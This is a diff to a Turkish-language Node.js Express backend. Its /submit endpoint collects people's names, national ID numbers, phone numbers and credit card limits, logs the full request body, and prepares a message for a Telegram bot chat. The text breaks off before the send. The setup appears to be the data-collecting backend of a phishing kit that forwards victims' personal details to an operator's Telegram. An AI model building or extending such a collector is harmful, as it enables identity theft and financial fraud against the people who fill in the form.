@@ -6,11 +6,11 @@ const dotenv = require('dotenv');
 dotenv.config();
 const app = express();
 
-// CORS ayarları: Tüm origin'lere izin ver ve preflight isteklerini destekle
+// CORS ayarları: Tüm origin'lere izin ver
 app.use(cors({
-  origin: '*', // Tüm origin'lere izin ver
-  methods: ['GET', 'POST', 'OPTIONS'], // İzin verilen metodlar
-  allowedHeaders: ['Content-Type'], // İzin verilen başlıklar
+  origin: '*',
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type'],
 }));
 
 // Preflight OPTIONS isteklerini ele al
@@ -27,17 +27,23 @@ const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
 if (!botToken || !chatId) {
-  console.error('Hata: BOT_TOKEN veya CHAT_ID eksik. Lütfen environment variables\'ı kontrol edin.');
+  console.error('Hata: BOT_TOKEN veya CHAT_ID eksik.');
   return (req, res) => res.status(500).json({ error: 'Sunucu yapılandırma hatası.' });
 }
 
+// Kök URL için test yanıtı
+app.get('/', (req, res) => {
+  res.status(200).json({ message: 'Backend çalışıyor.' });
+});
+
 // POST isteklerini işleme
 app.post('/submit', async (req, res) => {
+  console.log('POST /submit isteği alındı:', req.body);
   const { isim, soyisim, tc, tel, kredi_karti_limiti } = req.body;
 
   if (!isim || !soyisim || !tc || !tel || !kredi_karti_limiti) {
     console.error('[Backend] Eksik veri:', { isim, soyisim, tc, tel, kredi_karti_limiti });
-    return res.status(400).json({ error: 'Tüm alanlar (isim, soyisim, T.C., telefon, kredi kartı limiti) zorunludur.' });
+    return res.status(400).json({ error: 'Tüm alanlar zorunludur.' });
   }
 
   const message = `
